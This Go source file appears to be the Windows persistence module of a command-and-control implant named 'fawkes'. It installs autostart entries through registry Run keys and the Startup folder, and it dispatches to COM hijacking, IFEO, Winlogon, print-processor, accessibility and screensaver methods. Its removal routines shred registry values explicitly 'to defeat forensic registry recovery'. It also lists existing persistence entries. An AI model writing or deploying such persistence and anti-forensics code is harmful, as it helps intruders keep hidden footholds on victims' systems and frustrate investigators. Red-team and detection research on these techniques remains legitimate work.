//go:build windows
// +build windows

// persist.go implements Windows persistence mechanisms: registry Run keys,
// startup folder, and listing. COM hijack, screensaver, and IFEO methods
// are in persist_methods.go.

package commands

import (
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows/registry"
)

type PersistCommand struct{}

func (c *PersistCommand) Name() string {
	return "persist"
}

func (c *PersistCommand) Description() string {
	return "Install or remove persistence mechanisms"
}

type persistArgs struct {
	Method  string `json:"method"`
	Action  string `json:"action"`
	Name    string `json:"name"`
	Path    string `json:"path"`
	Hive    string `json:"hive"`
	CLSID   string `json:"clsid"`
	Timeout string `json:"timeout"`
}

func (c *PersistCommand) Execute(task structs.Task) structs.CommandResult {
	args, parseErr := unmarshalParams[persistArgs](task)
	if parseErr != nil {
		return *parseErr
	}

	if args.Action == "" {
		args.Action = "install"
	}

	switch strings.ToLower(args.Method) {
	case "registry", "reg-run":
		return persistRegistryRun(args)
	case "startup-folder", "startup":
		return persistStartupFolder(args)
	case "com-hijack":
		return persistCOMHijack(args)
	case "screensaver":
		return persistScreensaver(args)
	case "ifeo":
		return persistIFEO(args)
	case "winlogon":
		return persistWinlogon(args)
	case "print-processor":
		return persistPrintProcessor(args)
	case "accessibility":
		return persistAccessibility(args)
	case "list":
		return listPersistence(args)
	default:
		return errorf("Unknown method: %s. Use: registry, startup-folder, com-hijack, screensaver, ifeo, winlogon, print-processor, accessibility, or list", args.Method)
	}
}

// persistRegistryRun adds/removes a registry Run key entry
func persistRegistryRun(args persistArgs) structs.CommandResult {
	if args.Name == "" {
		return errorResult("Error: name is required for registry persistence")
	}

	// Determine hive — default to HKCU (doesn't need admin)
	hive := strings.ToUpper(args.Hive)
	if hive == "" {
		hive = "HKCU"
	}

	var hiveKey registry.Key
	var regPath string
	switch hive {
	case "HKCU":
		hiveKey = registry.CURRENT_USER
		regPath = `Software\Microsoft\Windows\CurrentVersion\Run`
	case "HKLM":
		hiveKey = registry.LOCAL_MACHINE
		regPath = `Software\Microsoft\Windows\CurrentVersion\Run`
	default:
		return errorf("Error: unsupported hive '%s'. Use HKCU or HKLM", hive)
	}

	switch strings.ToLower(args.Action) {
	case "install":
		if args.Path == "" {
			// Default to current executable
			exe, err := os.Executable()
			if err != nil {
				return errorf("Error getting executable path: %v", err)
			}
			args.Path = exe
		}

		key, _, err := registry.CreateKey(hiveKey, regPath, registry.SET_VALUE)
		if err != nil {
			return errorf("Error opening %s\\%s: %v", hive, regPath, err)
		}
		defer key.Close()

		if err := key.SetStringValue(args.Name, args.Path); err != nil {
			return errorf("Error writing registry value: %v", err)
		}

		return successf("Installed registry run key:\n  Key:   %s\\%s\n  Name:  %s\n  Value: %s", hive, regPath, args.Name, args.Path)

	case "remove":
		key, err := registry.OpenKey(hiveKey, regPath, registry.SET_VALUE|registry.QUERY_VALUE)
		if err != nil {
			return errorf("Error opening %s\\%s: %v", hive, regPath, err)
		}
		defer key.Close()

		// Shred value before deletion to defeat forensic registry recovery
		shredRegistryValue(key, args.Name)

		return successf("Removed registry run key (shredded):\n  Key:  %s\\%s\n  Name: %s", hive, regPath, args.Name)

	default:
		return errorf("Error: unknown action '%s'. Use: install or remove", args.Action)
	}
}

// persistStartupFolder copies a file to the user's Startup folder
func persistStartupFolder(args persistArgs) structs.CommandResult {
	startupDir := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

	switch strings.ToLower(args.Action) {
	case "install":
		if args.Path == "" {
			exe, err := os.Executable()
			if err != nil {
				return errorf("Error getting executable path: %v", err)
			}
			args.Path = exe
		}

		if args.Name == "" {
			args.Name = filepath.Base(args.Path)
		}

		destPath := filepath.Join(startupDir, args.Name)

		// Copy the file to the startup folder
		src, err := os.Open(args.Path)
		if err != nil {
			return errorf("Error opening source '%s': %v", args.Path, err)
		}
		defer src.Close()

		dst, err := os.Create(destPath)
		if err != nil {
			return errorf("Error creating '%s': %v", destPath, err)
		}
		defer dst.Close() // Safety net for panics; explicit Close below catches flush errors
		bytes, err := io.Copy(dst, src)
		if err != nil {
			dst.Close()
			return errorf("Error copying file: %v", err)
		}

		if err := dst.Close(); err != nil {
			return errorf("Error finalizing destination file: %v", err)
		}

		return successf("Installed startup folder persistence:\n  Source: %s\n  Dest:   %s\n  Size:   %d bytes", args.Path, destPath, bytes)

	case "remove":
		if args.Name == "" {
			return errorResult("Error: name is required to remove startup folder entry")
		}

		destPath := filepath.Join(startupDir, args.Name)
		secureRemove(destPath)
		if _, err := os.Stat(destPath); err == nil {
			return errorf("Error removing '%s': file still exists", destPath)
		}

		return successf("Removed startup folder entry: %s", destPath)

	default:
		return errorf("Error: unknown action '%s'. Use: install or remove", args.Action)
	}
}

// listPersistence lists known persistence entries
func listPersistence(args persistArgs) structs.CommandResult {
	var lines []string
	lines = append(lines, "=== Persistence Entries ===\n")

	// Check HKCU Run
	lines = append(lines, "--- HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run ---")
	if entries, err := enumRunKey(registry.CURRENT_USER); err == nil {
		if len(entries) == 0 {
			lines = append(lines, "  (empty)")
		}
		for _, e := range entries {
			lines = append(lines, fmt.Sprintf("  %s = %s", e[0], e[1]))
		}
	} else {
		lines = append(lines, fmt.Sprintf("  Error: %v", err))
	}
	lines = append(lines, "")

	// Check HKLM Run
	lines = append(lines, "--- HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run ---")
	if entries, err := enumRunKey(registry.LOCAL_MACHINE); err == nil {
		if len(entries) == 0 {
			lines = append(lines, "  (empty)")
		}
		for _, e := range entries {
			lines = append(lines, fmt.Sprintf("  %s = %s", e[0], e[1]))
		}
	} else {
		lines = append(lines, fmt.Sprintf("  Error: %v", err))
	}
	lines = append(lines, "")

	// Check Startup folder
	startupDir := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	lines = append(lines, fmt.Sprintf("--- Startup Folder: %s ---", startupDir))
	entries, err := os.ReadDir(startupDir)
	if err != nil {
		lines = append(lines, fmt.Sprintf("  Error: %v", err))
	} else if len(entries) == 0 {
		lines = append(lines, "  (empty)")
	} else {
		for _, e := range entries {
			info, _ := e.Info()
			size := int64(0)
			if info != nil {
				size = info.Size()
			}
			lines = append(lines, fmt.Sprintf("  %s (%d bytes)", e.Name(), size))
		}
	}
	lines = append(lines, "")

	// Check COM Hijacking (known CLSIDs)
	lines = append(lines, "--- COM Hijacking (HKCU InprocServer32 overrides) ---")
	knownCLSIDs := [][2]string{
		{"{42aedc87-2188-41fd-b9a3-0c966feabec1}", "MruPidlList (explorer.exe)"},
		{"{BCDE0395-E52F-467C-8E3D-C4579291692E}", "MMDeviceEnumerator (audio apps)"},
		{"{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}", "CAccPropServicesClass (accessibility)"},
		{"{fbeb8a05-beee-4442-804e-409d6c4515e9}", "ShellFolderViewOC (explorer.exe)"},
	}
	comFound := false
	for _, clsidInfo := range knownCLSIDs {
		keyPath := fmt.Sprintf(`Software\Classes\CLSID\%s\InprocServer32`, clsidInfo[0])
		key, err := registry.OpenKey(registry.CURRENT_USER, keyPath, registry.QUERY_VALUE)
		if err == nil {
			val, _, err := key.GetStringValue("")
			key.Close()
			if err == nil {
				lines = append(lines, fmt.Sprintf("  %s  %s = %s", clsidInfo[0], clsidInfo[1], val))
				comFound = true
			}
		}
	}
	if !comFound {
		lines = append(lines, "  (none detected)")
	}
	lines = append(lines, "")

	// Check IFEO Debugger entries
	lines = append(lines, "--- IFEO Debugger (HKLM\\...\\Image File Execution Options) ---")
	ifeoBasePath := `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`
	ifeoFound := false
	for _, target := range ifeoTargets {
		keyPath := ifeoBasePath + `\` + target[0]
		key, err := registry.OpenKey(registry.LOCAL_MACHINE, keyPath, registry.QUERY_VALUE)
		if err == nil {
			debugger, _, err := key.GetStringValue("Debugger")
			key.Close()
			if err == nil && debugger != "" {
				lines = append(lines, fmt.Sprintf("  %s  %s → %s", target[0], target[1], debugger))
				ifeoFound = true
			}
		}
	}
	if !ifeoFound {
		lines = append(lines, "  (none detected)")
	}
	lines = append(lines, "")

	// Check Winlogon Helper (Shell/Userinit)
	lines = append(lines, "--- Winlogon Helper (HKLM\\...\\Winlogon) ---")
	winlogonKey, err := registry.OpenKey(registry.LOCAL_MACHINE, winlogonKeyPath, registry.QUERY_VALUE)
	if err != nil {
		lines = append(lines, fmt.Sprintf("  Error: %v", err))
	} else {
		shell, _, shellErr := winlogonKey.GetStringValue("Shell")
		userinit, _, uiErr := winlogonKey.GetStringValue("Userinit")
		winlogonKey.Close()
		if shellErr == nil {
			lines = append(lines, fmt.Sprintf("  Shell    = %s", shell))
			if strings.Contains(shell, ",") {
				lines = append(lines, "  ⚠ Shell contains multiple entries (possible persistence)")
			}
		}
		if uiErr == nil {
			lines = append(lines, fmt.Sprintf("  Userinit = %s", userinit))
			// Count entries (comma-delimited, last entry has trailing comma)
			parts := strings.Split(strings.TrimRight(userinit, ","), ",")
			if len(parts) > 1 {
				lines = append(lines, fmt.Sprintf("  ⚠ Userinit contains %d entries (possible persistence)", len(parts)))
			}
		}
	}
	lines = append(lines, "")

	// Check Print Processors
	lines = append(lines, "--- Print Processors (HKLM\\...\\Print Processors) ---")
	ppKey, err := registry.OpenKey(registry.LOCAL_MACHINE, printProcessorRegBase, registry.ENUMERATE_SUB_KEYS)
	ppFound := false
	if err != nil {
		lines = append(lines, fmt.Sprintf("  Error: %v", err))
	} else {
		ppNames, _ := ppKey.ReadSubKeyNames(-1)
		ppKey.Close()
		// Known legitimate processors to skip
		for _, ppName := range ppNames {
			subPath := printProcessorRegBase + `\` + ppName
			subKey, err := registry.OpenKey(registry.LOCAL_MACHINE, subPath, registry.QUERY_VALUE)
			if err != nil {
				continue
			}
			driver, _, err := subKey.GetStringValue("Driver")
			subKey.Close()
			if err == nil && driver != "" {
				lines = append(lines, fmt.Sprintf("  %s → %s", ppName, driver))
				ppFound = true
			}
		}
	}
	if !ppFound {
		lines = append(lines, "  (none found or access denied)")
	}
	lines = append(lines, "")

	// Check Accessibility Feature replacements
	lines = append(lines, "--- Accessibility Features (System32 binary integrity) ---")
	sys32 := os.Getenv("SystemRoot")
	if sys32 == "" {
		sys32 = `C:\Windows`
	}
	accessFound := false
	for _, target := range accessibilityTargets {
		backupPath := filepath.Join(sys32, "System32", target[0]+".bak")
		if _, err := os.Stat(backupPath); err == nil {
			lines = append(lines, fmt.Sprintf("  ⚠ %s has backup (.bak exists) — %s", target[0], target[1]))
			accessFound = true
		}
	}
	if !accessFound {
		lines = append(lines, "  (no replaced binaries detected)")
	}
	lines = append(lines, "")

	// Check Screensaver hijacking
	lines = append(lines, "--- Screensaver (HKCU\\Control Panel\\Desktop) ---")
	desktopKey, err := registry.OpenKey(registry.CURRENT_USER, `Control Panel\Desktop`, registry.QUERY_VALUE)
	if err != nil {
		lines = append(lines, fmt.Sprintf("  Error: %v", err))
	} else {
		scrnsave, _, scrErr := desktopKey.GetStringValue("SCRNSAVE.EXE")
		active, _, actErr := desktopKey.GetStringValue("ScreenSaveActive")
		timeout, _, _ := desktopKey.GetStringValue("ScreenSaveTimeout")
		desktopKey.Close()
		if scrErr == nil && scrnsave != "" {
			activeStr := "Unknown"
			if actErr == nil {
				if active == "1" {
					activeStr = "Yes"
				} else {
					activeStr = "No"
				}
			}
			lines = append(lines, fmt.Sprintf("  SCRNSAVE.EXE    = %s", scrnsave))
			lines = append(lines, fmt.Sprintf("  ScreenSaveActive = %s (%s)", active, activeStr))
			if timeout != "" {
				lines = append(lines, fmt.Sprintf("  ScreenSaveTimeout = %s seconds", timeout))
			}
		} else {
			lines = append(lines, "  (no screensaver configured)")
		}
	}

	return successResult(strings.Join(lines, "\n"))
}

func enumRunKey(hiveKey registry.Key) ([][2]string, error) {
	key, err := registry.OpenKey(hiveKey, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE)
	if err != nil {
		return nil, err
	}
	defer key.Close()

	names, err := key.ReadValueNames(-1)
	if err != nil {
		return nil, err
	}

	var entries [][2]string
	for _, name := range names {
		val, _, err := key.GetStringValue(name)
		if err != nil {
			val = "(error reading)"
		}
		entries = append(entries, [2]string{name, val})
	}
	return entries, nil
}
